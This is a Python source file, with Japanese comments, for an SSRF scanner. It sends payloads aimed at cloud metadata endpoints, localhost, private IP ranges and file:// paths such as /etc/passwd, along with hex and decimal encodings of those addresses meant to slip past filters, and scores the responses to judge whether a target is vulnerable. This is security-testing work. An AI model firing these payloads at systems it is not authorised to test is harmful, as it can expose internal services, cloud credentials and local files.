"""
SSRF Tester - SSRF脆弱性テスター

非破壊的ペイロードによるServer-Side Request Forgery検出
"""

import logging
import asyncio
from typing import List, Dict, Optional, Any
from dataclasses import dataclass
from enum import Enum
from urllib.parse import urlparse
import ipaddress
import socket
from pathlib import Path
import httpx
import yaml

logger = logging.getLogger(__name__)


class SSRFPayloadType(Enum):
    """SSRFペイロードタイプ"""
    CLOUD_METADATA = "cloud_metadata"
    LOCALHOST = "localhost"
    INTERNAL_IP = "internal_ip"
    FILE_PROTOCOL = "file_protocol"
    DNS_REBINDING = "dns_rebinding"


@dataclass
class SSRFResult:
    """SSRF検出結果"""
    url: str
    parameter: str
    payload: str
    payload_type: SSRFPayloadType
    vulnerable: bool = False
    response_code: int = 0
    response_length: int = 0
    evidence: str = ""
    severity: str = "high"
    matched_variant: str = ""
    matched_variant_source: str = ""
    confidence_score: float = 0.0
    confidence_level: str = "low"
    confidence_breakdown: Optional[List[Dict[str, Any]]] = None
    final_url: str = ""
    redirect_chain: Optional[List[str]] = None
    destination_class: str = "unknown"
    resolved_ips: Optional[List[str]] = None


class SSRFTester:
    """
    SSRF脆弱性テスター
    
    機能:
    - 非破壊的ペイロード使用
    - クラウドメタデータ検出
    - 内部IP検出
    - DNSリバインディング検出
    
    ⚠️ 注意: 非破壊的ペイロードのみ使用
    """

    BYPASS_VARIANTS = {
        SSRFPayloadType.CLOUD_METADATA: [
            "169.254.169.254",
            "0xa9fea9fe",
            "2852039166",
            "::ffff:169.254.169.254",
            "metadata.google.internal",
        ],
        SSRFPayloadType.LOCALHOST: [
            "127.0.0.1",
            "127.1",
            "0x7f000001",
            "2130706433",
            "::1",
            "localhost",
        ],
        SSRFPayloadType.INTERNAL_IP: [
            "10.",
            "172.16.",
            "192.168.",
            "::ffff:10.",
            "::ffff:192.168.",
        ],
    }
    
    # 非破壊的SSRFペイロード
    SAFE_PAYLOADS = {
        SSRFPayloadType.CLOUD_METADATA: [
            # AWS（読み取りのみ、変更なし）
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/hostname",
            "http://169.254.169.254/latest/meta-data/instance-id",
            # GCP
            "http://metadata.google.internal/computeMetadata/v1/",
            # Azure
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            # DigitalOcean
            "http://169.254.169.254/metadata/v1/",
        ],
        SSRFPayloadType.LOCALHOST: [
            "http://127.0.0.1/",
            "http://localhost/",
            "http://127.0.0.1:80/",
            "http://127.0.0.1:8080/",
            "http://127.0.0.1:443/",
            "http://[::1]/",
            "http://127.1/",
            "http://0.0.0.0/",
        ],
        SSRFPayloadType.INTERNAL_IP: [
            "http://10.0.0.1/",
            "http://172.16.0.1/",
            "http://192.168.0.1/",
            "http://192.168.1.1/",
        ],
        SSRFPayloadType.FILE_PROTOCOL: [
            "file:///etc/passwd",
            "file:///etc/hostname",
            "file:///proc/version",
            "file:///c:/windows/win.ini",
        ],
    }
    
    # 脆弱性を示すレスポンスパターン
    VULN_INDICATORS = {
        SSRFPayloadType.CLOUD_METADATA: [
            "ami-id", "instance-id", "hostname",
            "computeMetadata", "metadata",
            # IMDSv2: token required 401 responses are meaningful SSRF signals
            "x-aws-ec2-metadata-token",
            "ec2 metadata token",
            "imdsv2",
            "token required",
        ],
        SSRFPayloadType.LOCALHOST: [
            "<html>", "<!DOCTYPE", "nginx", "apache"
        ],
        SSRFPayloadType.FILE_PROTOCOL: [
            "root:", "/bin/bash", "Linux version",
            "[fonts]", "for 16-bit"
        ],
    }
    
    TIMEOUT = 10
    BASELINE_PROBE = "nonexistent_ssrf_check_404"
    CONFIDENCE_SCHEMA_VERSION = "1.0"
    CONFIDENCE_THRESHOLD = 3.0
    CONFIDENCE_WEIGHTS = {
        "indicator_hit": 2.0,
        "bypass_variant_hit": 1.5,
        "imdsv2_hint": 1.0,
        "destination_internal": 2.0,
        "metadata_endpoint": 2.0,
        "baseline_diff_status": 1.0,
        "baseline_diff_size": 1.0,
        "open_redirect_only_penalty": -2.0,
        "internal_evidence_recovery": 1.5,
        "redirect_chain_internal": 1.5,
        "redirect_chain_metadata": 1.5,
    }
    BASELINE_SIZE_DIFF_THRESHOLD_BY_TYPE = {
        SSRFPayloadType.CLOUD_METADATA: 80,
        SSRFPayloadType.LOCALHOST: 200,
        SSRFPayloadType.INTERNAL_IP: 160,
        SSRFPayloadType.FILE_PROTOCOL: 120,
        SSRFPayloadType.DNS_REBINDING: 180,
    }

    def __init__(self, auth_headers: Optional[Dict] = None):
        self.auth_headers = auth_headers or {}
        self.results: List[SSRFResult] = []
        self._load_quality_config_from_features()

    def _load_quality_config_from_features(self) -> None:
        """
        config/features.yaml の phase3.ssrf_quality から
        閾値と重みを上書きする。
        """
        features_path = Path("config/features.yaml")
        if not features_path.exists():
            return
        try:
            raw = yaml.safe_load(features_path.read_text(encoding="utf-8")) or {}
        except Exception:
            return

        ssrf_quality = (
            raw.get("features", {})
            .get("phase3", {})
            .get("ssrf_quality", {})
        )
        if not ssrf_quality or not ssrf_quality.get("enabled", True):
            return

        self.CONFIDENCE_THRESHOLD = float(ssrf_quality.get("confidence_threshold", self.CONFIDENCE_THRESHOLD))
        self.BASELINE_PROBE = str(ssrf_quality.get("baseline_probe", self.BASELINE_PROBE))

        weights = ssrf_quality.get("confidence_weights", {})
        if isinstance(weights, dict):
            for k, v in weights.items():
                if k in self.CONFIDENCE_WEIGHTS:
                    self.CONFIDENCE_WEIGHTS[k] = float(v)

        thresholds = ssrf_quality.get("baseline_size_diff_threshold_by_type", {})
        if isinstance(thresholds, dict):
            mapping = {
                "cloud_metadata": SSRFPayloadType.CLOUD_METADATA,
                "localhost": SSRFPayloadType.LOCALHOST,
                "internal_ip": SSRFPayloadType.INTERNAL_IP,
                "file_protocol": SSRFPayloadType.FILE_PROTOCOL,
                "dns_rebinding": SSRFPayloadType.DNS_REBINDING,
            }
            for key, enum_key in mapping.items():
                if key in thresholds:
                    self.BASELINE_SIZE_DIFF_THRESHOLD_BY_TYPE[enum_key] = int(thresholds[key])
    
    def test(
        self,
        url: str,
        parameters: List[str],
        methods: List[str] = None
    ) -> List[SSRFResult]:
        """
        SSRF脆弱性テスト
        
        Args:
            url: テスト対象URL
            parameters: テスト対象パラメータ名
            methods: HTTPメソッド（デフォルト: GET, POST）
        """
        if methods is None:
            methods = ["GET", "POST"]
        
        results = []
        
        for param in parameters:
            for payload_type, payloads in self.SAFE_PAYLOADS.items():
                for payload in payloads:
                    result = self._test_payload(
                        url=url,
                        parameter=param,
                        payload=payload,
                        payload_type=payload_type
                    )
                    if result:
                        results.append(result)
                        self.results.append(result)
        
        return results
    
    def _test_payload(
        self,
        url: str,
        parameter: str,
        payload: str,
        payload_type: SSRFPayloadType
    ) -> Optional[SSRFResult]:
        """ペイロードテスト"""
        logger.info("Testing SSRF: %s=%s on %s", parameter, payload[:30], url)
        headers = dict(self.auth_headers)
        try:
            with httpx.Client(timeout=self.TIMEOUT, follow_redirects=True) as client:
                baseline_response = self._send_request(client, url, parameter, self.BASELINE_PROBE, headers)
                response = self._send_request(client, url, parameter, payload, headers)
        except httpx.TimeoutException:
            return SSRFResult(
                url=url,
                parameter=parameter,
                payload=payload,
                payload_type=payload_type,
                vulnerable=False,
                response_code=0,
                evidence="timeout",
            )
        except Exception:
            return None

        vuln_meta = self._analyze_response(response.text, payload_type, payload=payload)
        confidence = self._score_confidence(
            vuln_meta=vuln_meta,
            payload_type=payload_type,
            payload=payload,
            response=response,
            baseline_response=baseline_response,
        )
        vulnerable = confidence["score"] >= self.CONFIDENCE_THRESHOLD
        final_url = str(response.url)
        redirect_chain = [str(h.url) for h in response.history]
        resolved_ips = self._resolve_ips(urlparse(final_url).hostname or urlparse(payload).hostname or "")
        destination_class = self._classify_destination(payload, final_url, resolved_ips)
        return SSRFResult(
            url=url,
            parameter=parameter,
            payload=payload,
            payload_type=payload_type,
            vulnerable=vulnerable,
            response_code=response.status_code,
            response_length=len(response.content),
            evidence=response.text[:200] if vulnerable else "",
            severity="high",
            matched_variant=str(vuln_meta.get("matched_variant", "") or ""),
            matched_variant_source=str(vuln_meta.get("matched_variant_source", "") or ""),
            confidence_score=confidence["score"],
            confidence_level=confidence["level"],
            confidence_breakdown=confidence["breakdown"],
            final_url=final_url,
            redirect_chain=redirect_chain,
            destination_class=destination_class,
            resolved_ips=resolved_ips,
        )

    def _send_request(
        self,
        client: httpx.Client,
        url: str,
        parameter: str,
        payload: str,
        headers: Dict[str, str],
    ) -> httpx.Response:
        return client.get(url, params={parameter: payload}, headers=headers)

    def _score_confidence(
        self,
        vuln_meta: Dict[str, str | bool],
        payload_type: SSRFPayloadType,
        payload: str,
        response: httpx.Response,
        baseline_response: Optional[httpx.Response],
    ) -> Dict[str, Any]:
        score = 0.0
        breakdown: List[Dict[str, Any]] = []

        def add(signal: str, observed: bool, reason_code: str):
            nonlocal score
            weight = float(self.CONFIDENCE_WEIGHTS.get(signal, 0.0))
            subtotal = weight if observed else 0.0
            score += subtotal
            breakdown.append(
                {
                    "schema_version": self.CONFIDENCE_SCHEMA_VERSION,
                    "signal": signal,
                    "weight": weight,
                    "observed": observed,
                    "subtotal": subtotal,
                    "reason_code": reason_code,
                }
            )

        matched_source = str(vuln_meta.get("matched_variant_source", ""))
        matched_variant = str(vuln_meta.get("matched_variant", ""))
        body = (response.text or "").lower()

        add("indicator_hit", matched_source == "indicator", "INDICATOR_MATCH")
        add("bypass_variant_hit", matched_source == "bypass_variant", "BYPASS_VARIANT_MATCH")
        add(
            "imdsv2_hint",
            payload_type == SSRFPayloadType.CLOUD_METADATA and "token" in body and "metadata" in body,
            "IMDSV2_SIGNAL",
        )

        final_url = str(response.url)
        redirect_chain = [str(h.url) for h in response.history]
        resolved_ips = self._resolve_ips(urlparse(final_url).hostname or urlparse(payload).hostname or "")
        destination_class = self._classify_destination(payload, final_url, resolved_ips)
        chain_classes = self._classify_redirect_chain(redirect_chain)
        add("destination_internal", destination_class in {"internal", "link_local", "localhost"}, "DEST_INTERNAL")
        add("redirect_chain_internal", any(c in {"internal", "link_local", "localhost"} for c in chain_classes), "CHAIN_INTERNAL")
        add("redirect_chain_metadata", any(c == "metadata" for c in chain_classes), "CHAIN_METADATA")
        add(
            "metadata_endpoint",
            payload_type == SSRFPayloadType.CLOUD_METADATA and self._is_metadata_endpoint(final_url or payload),
            "METADATA_ENDPOINT",
        )

        if baseline_response is not None:
            add("baseline_diff_status", response.status_code != baseline_response.status_code, "BASELINE_STATUS_DIFF")
            size_diff = abs(len(response.content) - len(baseline_response.content))
            threshold = self._baseline_size_threshold(payload_type)
            add("baseline_diff_size", size_diff >= threshold, "BASELINE_SIZE_DIFF")

        open_redirect_only = self._is_open_redirect_only(payload, redirect_chain, destination_class, matched_variant)
        add("open_redirect_only_penalty", open_redirect_only, "OPEN_REDIRECT_ONLY")
        recovery = open_redirect_only and self._has_internal_recovery_signal(
            payload_type, destination_class, matched_source, final_url
        )
        add("internal_evidence_recovery", recovery, "INTERNAL_RECOVERY")

        if score >= 5.0:
            level = "high"
        elif score >= self.CONFIDENCE_THRESHOLD:
            level = "medium"
        else:
            level = "low"
        return {"score": score, "level": level, "breakdown": breakdown}

    def _is_open_redirect_only(
        self,
        payload: str,
        redirect_chain: List[str],
        destination_class: str,
        matched_variant: str,
    ) -> bool:
        if not redirect_chain:
            return False
        payload_host = (urlparse(payload).hostname or "").lower()
        last_redirect_host = (urlparse(redirect_chain[-1]).hostname or "").lower()
        if destination_class in {"internal", "link_local", "localhost"}:
            return False
        if matched_variant:
            return False
        return bool(payload_host and last_redirect_host and payload_host != last_redirect_host)

    def _has_internal_recovery_signal(
        self,
        payload_type: SSRFPayloadType,
        destination_class: str,
        matched_source: str,
        final_url: str,
    ) -> bool:
        if destination_class in {"internal", "link_local", "localhost"}:
            return True
        if payload_type == SSRFPayloadType.CLOUD_METADATA and self._is_metadata_endpoint(final_url):
            return True
        return matched_source in {"indicator", "bypass_variant"}

    def _is_metadata_endpoint(self, url_or_payload: str) -> bool:
        host = (urlparse(url_or_payload).hostname or "").lower()
        return host in {"169.254.169.254", "metadata.google.internal"}

    def _baseline_size_threshold(self, payload_type: SSRFPayloadType) -> int:
        return int(self.BASELINE_SIZE_DIFF_THRESHOLD_BY_TYPE.get(payload_type, 120))

    def _resolve_ips(self, host: str) -> List[str]:
        if not host:
            return []
        try:
            infos = socket.getaddrinfo(host, None)
        except Exception:
            return []
        ips: List[str] = []
        for info in infos:
            ip = info[4][0]
            if ip not in ips:
                ips.append(ip)
        return ips

    def _classify_destination(self, payload: str, final_url: str, resolved_ips: List[str]) -> str:
        if self._is_metadata_endpoint(final_url) or self._is_metadata_endpoint(payload):
            return "metadata"
        for candidate in [urlparse(final_url).hostname or "", urlparse(payload).hostname or ""]:
            if candidate in {"localhost", "127.0.0.1", "::1"}:
                return "localhost"
        for ip_str in resolved_ips:
            try:
                ip_obj = ipaddress.ip_address(ip_str)
            except ValueError:
                continue
            if ip_obj.is_loopback:
                return "localhost"
            if ip_obj.is_link_local:
                return "link_local"
            if ip_obj.is_private:
                return "internal"
        return "public"

    def _classify_redirect_chain(self, redirect_chain: List[str]) -> List[str]:
        classes: List[str] = []
        for hop_url in redirect_chain:
            hop_host = urlparse(hop_url).hostname or ""
            hop_ips = self._resolve_ips(hop_host)
            cls = self._classify_destination(hop_url, hop_url, hop_ips)
            classes.append(cls)
        return classes

    async def scan_async(
        self,
        url: str,
        parameters: List[str],
        auth_headers: Optional[Dict] = None,
    ) -> List[SSRFResult]:
        """非同期ラッパー"""
        if auth_headers:
            self.auth_headers = auth_headers
        return await asyncio.to_thread(self.test, url, parameters)
    
    def _analyze_response(
        self,
        response_text: str,
        payload_type: SSRFPayloadType,
        payload: str = "",
    ) -> Dict[str, str | bool]:
        """レスポンスを分析して脆弱性判定"""
        body = (response_text or "").lower()
        indicators = self.VULN_INDICATORS.get(payload_type, [])

        for indicator in indicators:
            if indicator.lower() in body:
                return {
                    "vulnerable": True,
                    "matched_variant": indicator,
                    "matched_variant_source": "indicator",
                }

        # payload到達先のバリエーション（16進/10進/IPv6-mapped 等）をレスポンス内で補足する
        matched_variant = self._check_final_destination(response_text, payload_type, payload)
        if matched_variant:
            return {
                "vulnerable": True,
                "matched_variant": matched_variant,
                "matched_variant_source": "bypass_variant",
            }

        # IMDSv2 401系エラーパターン（本文のみで観測できるケース）
        if payload_type == SSRFPayloadType.CLOUD_METADATA:
            if ("unauthorized" in body or "401" in body) and (
                "metadata" in body or "token" in body
            ):
                return {
                    "vulnerable": True,
                    "matched_variant": "imdsv2_401_token_required",
                    "matched_variant_source": "heuristic",
                }

        return {"vulnerable": False, "matched_variant": "", "matched_variant_source": ""}

    def _check_final_destination(
        self,
        response_text: str,
        payload_type: SSRFPayloadType,
        payload: str,
    ) -> str:
        """
        SSRF先URLがアプリ内部でリダイレクト・正規化された際の到達先痕跡を判定する。
        """
        body = (response_text or "").lower()
        variants = [v.lower() for v in self.BYPASS_VARIANTS.get(payload_type, [])]

        host = ""
        try:
            host = (urlparse(payload).hostname or "").lower()
        except Exception:
            host = ""
        if host:
            variants.append(host)

        for variant in variants:
            if variant and variant in body:
                return variant
        return ""
    
    def get_vulnerable(self) -> List[SSRFResult]:
        """脆弱と判定されたもののみ"""
        return [r for r in self.results if r.vulnerable]
    
    def get_summary(self) -> Dict:
        """サマリー"""
        vuln_count = len(self.get_vulnerable())
        by_type = {}
        for r in self.results:
            by_type.setdefault(r.payload_type.value, 0)
            if r.vulnerable:
                by_type[r.payload_type.value] += 1
        
        return {
            "total_tests": len(self.results),
            "vulnerable": vuln_count,
            "by_type": by_type,
        }
    
    def get_summary_for_ai(self) -> str:
        """AI向けサマリー"""
        summary = self.get_summary()
        return (
            f"SSRF Test: {summary['total_tests']} tests\n"
            f"Vulnerable: {summary['vulnerable']}\n"
            f"By type: {summary['by_type']}"
        )


def create_ssrf_tester() -> SSRFTester:
    """SSRFTester作成ヘルパー"""
    return SSRFTester()
